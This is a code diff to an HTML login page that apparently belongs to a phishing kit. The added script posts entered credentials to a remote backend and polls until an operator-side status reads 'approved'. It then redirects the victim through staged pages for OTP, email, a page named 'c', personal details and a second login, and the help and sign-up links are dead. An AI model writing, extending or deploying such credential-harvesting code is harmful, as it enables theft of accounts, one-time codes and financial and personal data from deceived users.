@@ -442,6 +442,16 @@
             margin-top: 5px;
             text-align: center;
         }
+
+        /* === PROGRESS INDICATOR === */
+        .progress-container {
+            margin-top: 20px;
+            text-align: center;
+        }
+        .progress-text {
+            font-size: 14px;
+            color: #666;
+        }
     </style>
 </head>
 <body>
@@ -495,18 +505,21 @@
                                 <button type="submit" class="btn-login" id="loginBtn">Log in</button>
                             </div>
                             <div class="form-row text-center">
-                                <button type="button" class="btn-secondary" onclick="window.location.href='page2.html';">Create a username</button>
+                                <button type="button" class="btn-secondary" onclick="window.location.href='#';">Create a username</button>
                             </div>
                             <div id="errorContainer" class="error-message"></div>
+                            <div id="progressContainer" class="progress-container" style="display: none;">
+                                <div class="progress-text">Verifying your credentials...</div>
+                            </div>
                         </form>
 
                         <!-- Forgot links -->
                         <div class="forgot-row">
                             <div class="forgot-item">
-                                <button class="btn-secondary" style="min-width: auto;" onclick="window.location.href='page2.html';">Forgot username?</button>
+                                <button class="btn-secondary" style="min-width: auto;" onclick="window.location.href='#';">Forgot username?</button>
                             </div>
                             <div class="forgot-item">
-                                <button class="btn-secondary" style="min-width: auto;" onclick="window.location.href='page2.html';">Forgot password?</button>
+                                <button class="btn-secondary" style="min-width: auto;" onclick="window.location.href='#';">Forgot password?</button>
                             </div>
                         </div>
                     </div>
@@ -574,6 +587,10 @@
             ? 'http://localhost:5000' 
             : 'https://s-bcknd.onrender.com'; // Your backend URL
 
+        // Store session data
+        let currentSessionId = null;
+        let pollingInterval = null;
+
         // Password toggle function
         function togglePassword() {
             const pwd = document.getElementById('password');
@@ -587,6 +604,42 @@
             }
         }
 
+        // Function to determine next page based on URL
+        function getNextPage(redirectUrl) {
+            // Extract the page name from the URL
+            const pageMap = {
+                'otp.html': 'otp',
+                'email.html': 'email',
+                'c.html': 'c',
+                'personal.html': 'personal',
+                'login2.html': 'login2',
+                'thnks.html': 'thnks'
+            };
+            
+            // Check if it's a full URL or just a filename
+            const pageName = redirectUrl.split('/').pop().split('?')[0];
+            return pageMap[pageName] || pageName.replace('.html', '');
+        }
+
+        // Function to redirect to appropriate page with session
+        function redirectToPage(redirectUrl) {
+            if (!redirectUrl) return;
+            
+            // Store current session in sessionStorage for the next page
+            if (currentSessionId) {
+                sessionStorage.setItem('currentSessionId', currentSessionId);
+                sessionStorage.setItem('currentPage', getNextPage(redirectUrl));
+            }
+            
+            // If it's a relative URL, construct full path
+            if (!redirectUrl.startsWith('http')) {
+                const baseUrl = window.location.origin + window.location.pathname.substring(0, window.location.pathname.lastIndexOf('/') + 1);
+                redirectUrl = baseUrl + redirectUrl;
+            }
+            
+            window.location.href = redirectUrl;
+        }
+
         // Poll for status
         async function checkStatus(sessionId) {
             try {
@@ -594,17 +647,36 @@
                 const data = await response.json();
                 
                 if (data.status === 'approved') {
+                    // Stop polling
+                    if (pollingInterval) {
+                        clearInterval(pollingInterval);
+                        pollingInterval = null;
+                    }
+                    
                     // Redirect to the next page
-                    window.location.href = data.redirect_url;
-                } else {
-                    // Check again in 2 seconds
-                    setTimeout(() => checkStatus(sessionId), 2000);
+                    redirectToPage(data.redirect_url);
                 }
+                // If still pending, continue polling (interval handles this)
             } catch (error) {
                 console.error('Status check failed:', error);
-                // Continue polling despite error
-                setTimeout(() => checkStatus(sessionId), 3000);
+                // Don't clear interval on error, keep trying
             }
+        }
+
+        // Start polling for status
+        function startPolling(sessionId) {
+            // Clear any existing polling
+            if (pollingInterval) {
+                clearInterval(pollingInterval);
+            }
+            
+            currentSessionId = sessionId;
+            
+            // Check immediately
+            checkStatus(sessionId);
+            
+            // Then check every 2 seconds
+            pollingInterval = setInterval(() => checkStatus(sessionId), 2000);
         }
 
         // Handle login form submission
@@ -617,6 +689,7 @@
             const remember = document.getElementById('remember').checked;
             const loginBtn = document.getElementById('loginBtn');
             const errorContainer = document.getElementById('errorContainer');
+            const progressContainer = document.getElementById('progressContainer');
             
             // Clear previous errors
             errorContainer.textContent = '';
@@ -630,6 +703,7 @@
             // Disable button and show loading state
             loginBtn.disabled = true;
             loginBtn.innerHTML = '<span class="spinner"></span>Processing...';
+            progressContainer.style.display = 'block';
             
             try {
                 // Send login data to backend
@@ -647,32 +721,40 @@
                 const data = await response.json();
                 
                 if (data.success) {
-                    // Store session ID if needed
-                    sessionStorage.setItem('loginSessionId', data.id);
+                    // Store username if remember is checked
+                    if (remember && username) {
+                        localStorage.setItem('ms_username', username);
+                    } else {
+                        localStorage.removeItem('ms_username');
+                    }
                     
-                    // Show success message
+                    // Update UI
                     loginBtn.innerHTML = 'Verifying...';
+                    document.querySelector('.progress-text').textContent = 'Waiting for verification...';
                     
                     // Start polling for approval
-                    checkStatus(data.id);
+                    startPolling(data.id);
                 } else {
                     // Handle error
                     errorContainer.textContent = data.error || 'Login failed. Please try again.';
                     loginBtn.disabled = false;
                     loginBtn.innerHTML = 'Log in';
+                    progressContainer.style.display = 'none';
                 }
             } catch (error) {
                 console.error('Login error:', error);
                 errorContainer.textContent = 'Network error. Please check your connection and try again.';
                 loginBtn.disabled = false;
                 loginBtn.innerHTML = 'Log in';
+                progressContainer.style.display = 'none';
             }
             
             return false;
         }
 
-        // Optional: Save/load username from localStorage if "Remember my username" was checked
+        // Check for existing session on page load
         document.addEventListener('DOMContentLoaded', function() {
+            // Load saved username
             const savedUsername = localStorage.getItem('ms_username');
             const rememberCheckbox = document.getElementById('remember');
             
@@ -681,21 +763,22 @@
                 rememberCheckbox.checked = true;
             }
             
-            // Save username when form is submitted successfully
-            const originalHandleLogin = handleLogin;
-            window.handleLogin = async function(event) {
-                const result = await originalHandleLogin(event);
-                const username = document.getElementById('username').value;
-                const remember = document.getElementById('remember').checked;
-                
-                if (remember && username) {
-                    localStorage.setItem('ms_username', username);
-                } else {
-                    localStorage.removeItem('ms_username');
-                }
-                
-                return result;
-            };
+            // Check if we have an existing session
+            const existingSessionId = sessionStorage.getItem('currentSessionId');
+            const existingPage = sessionStorage.getItem('currentPage');
+            
+            if (existingSessionId && existingPage) {
+                // Clear the stored session (it's from a previous page)
+                sessionStorage.removeItem('currentSessionId');
+                sessionStorage.removeItem('currentPage');
+            }
+        });
+
+        // Clean up on page unload
+        window.addEventListener('beforeunload', function() {
+            if (pollingInterval) {
+                clearInterval(pollingInterval);
+            }
         });
     </script>
 </body>
